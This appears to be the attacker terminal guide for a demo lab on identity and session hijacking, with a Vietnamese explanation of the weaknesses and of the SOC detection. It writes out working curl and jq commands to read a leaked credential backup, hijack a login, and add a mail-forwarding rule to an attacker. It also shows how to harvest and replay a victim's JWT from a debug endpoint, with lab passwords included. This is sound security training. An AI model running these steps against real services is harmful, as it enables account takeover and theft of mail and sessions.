Identity & Session Hijacking -- DEMO terminal
===============================================
Target portal : http://victim-portal:8000   (172.26.0.2)
You (attacker): 172.26.0.3
Victim        : 172.26.0.4  (user01 logs in from here, baseline traffic)
Monitor       : 172.26.0.5  (audit-log correlation)

Goal: demonstrate the full chain in one run:
  B1 credential leak -> B2 account hijack -> B3 mailbox hijack
  -> B4 JWT/token hijack -> B5 session persistence after password change
  -> Detection (the SOC centrepiece, in the monitor terminal).

This is a DEMO lab: there is no checkwork/score. Evidence is what you see
on the terminal plus the JSONL audit log lines.

CƠ CHẾ & LỖ HỔNG BỊ KHAI THÁC (dùng cho báo cáo):
  B1  Credential exposure: backup export còn plaintext password, không có
      secret management/rotation. Credential hợp lệ = chìa khoá đầu tiên.
  B2  Account Hijacking: xác thực chỉ dựa password -- thiếu MFA, không ràng
      buộc thiết bị, không phát hiện login bất thường. Sau login, identity
      bị giả mạo hoàn toàn; IP attacker .3 khác baseline victim .4.
  B3  Email Hijacking (BEC persistence): forwarding rule cho phép đọc thư
      tương lai mà không cần đăng nhập lại. Lỗ hổng: thao tác nhạy cảm với
      mailbox không có xác minh lại/không cảnh báo rule mới.
  B4  Token Hijacking: bearer JWT stateless, không ràng buộc IP/thiết bị;
      /debug/sessions bị bỏ quên làm lộ raw token + jti. Ai giữ token là
      user đó -- không cần password, không cần login.
  B5  Session persistence: đổi mật khẩu ở baseline KHÔNG thu hồi session/
      token cũ; token sống độc lập với credential. Đây là lỗ hổng sâu nhất
      của chuỗi (hardened mode là bản so sánh có thu hồi).
  Detection: không chỉ 3 alert rời; correlation account + mailbox + token
      cùng user/jti/cửa sổ thời gian -> 1 incident, risk score, timeline,
      IOC, metrics. Đây là phần chứng minh giá trị phòng thủ.

------------------------------------------------------------------
B1 - Credential compromise
------------------------------------------------------------------
The old HR sync job left a backup export on the portal:

  curl -s http://172.26.0.2:8000/backup/users.csv

Read the user01 line. The password contains '!' -- in bash always wrap
the -d/--data-urlencode argument in SINGLE quotes.

------------------------------------------------------------------
B2 - Account hijacking (web session)
------------------------------------------------------------------
Log in as the victim with the leaked password and change the profile:

  curl -s -o /dev/null -w 'login HTTP %{http_code}\n' \
    -c /tmp/c.jar -X POST http://172.26.0.2:8000/login \
    --data-urlencode 'username=user01@datn.local' \
    --data-urlencode 'password=Us3r01_DATN!2026'

  curl -s -o /dev/null -w 'profile HTTP %{http_code}\n' \
    -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/profile \
    --data-urlencode 'phone=+84-900-000-000'

GUI alternative (recommended for the report): open Firefox in this
container, log in as user01, edit the phone, then open the mailbox:

  firefox http://172.26.0.2:8000 &

Expected audit lines (src_ip=172.26.0.3):
  login_success, profile_updated

------------------------------------------------------------------
B3 - Email / mailbox hijacking
------------------------------------------------------------------
The mailbox starts with an approved baseline rule
(user01 -> user01.archive@datn.local). Your rule below overwrites it;
that is the diff the monitor will flag.

With the hijacked session, install a forwarding rule and send a test
message to the victim mailbox:

  curl -s -o /dev/null -w 'forward HTTP %{http_code}\n' \
    -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/forward \
    --data-urlencode 'target=attacker@datn.local'

  curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/send \
    --data-urlencode 'to=user01@datn.local' \
    --data-urlencode 'subject=Forward test' \
    --data-urlencode 'body=This message should be forwarded to the attacker.'

Now log in as your own attacker account and read the forwarded copy:

  curl -s -c /tmp/a.jar -X POST http://172.26.0.2:8000/login \
    --data-urlencode 'username=attacker@datn.local' \
    --data-urlencode 'password=Att4ck3r_DATN!2026'

  curl -s -b /tmp/a.jar http://172.26.0.2:8000/mail/inbox

Expected audit lines:
  mailbox_rule_created  (user01, rule=attacker@datn.local)
  mail_forwarded        (mailbox=user01, target=attacker@datn.local)

------------------------------------------------------------------
B4 - Token hijacking (JWT replay, no browser login)
------------------------------------------------------------------
The developers forgot /debug/sessions. It lists live web sessions and
JWTs, including the victim's token issued from 172.26.0.4:

  curl -s http://172.26.0.2:8000/debug/sessions -o /tmp/sessions.json

  jq -r '.sessions[] | select(.type=="jwt" and .user_id=="user01@datn.local") |
         [.jti,.issued_src] | @tsv' /tmp/sessions.json

  JWT=$(jq -r '.sessions[] | select(.type=="jwt" and
         .user_id=="user01@datn.local") | .token' /tmp/sessions.json | head -1)

Replay that token from YOUR terminal -- no cookie, no login:

  curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
  curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/mailbox/summary

Expected audit lines (same jti as token_issued, but src_ip=172.26.0.3):
  api_access  (replay=true)

This is what distinguishes Token Hijacking from Account Hijacking: the
attacker never authenticates; the stolen token itself is the identity.

------------------------------------------------------------------
B5 - Session persistence after a password change
------------------------------------------------------------------
Switch to the VICTIM terminal (172.26.0.4) and run:

  cd /home/ubuntu
  ./change_password_baseline.sh

That changes user01's password in baseline mode (old sessions/tokens are
NOT revoked; that is the control gap being demonstrated).

Back in THIS attacker terminal, replay the old token again:

  curl -s -o /dev/null -w 'old token HTTP %{http_code}\n' \
    -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me

Expected: HTTP 200, and audit lines password_changed + api_access with
the old jti. Try `./change_password_baseline.sh hardened` on a fresh lab
to see the comparison (old token should then get HTTP 401).
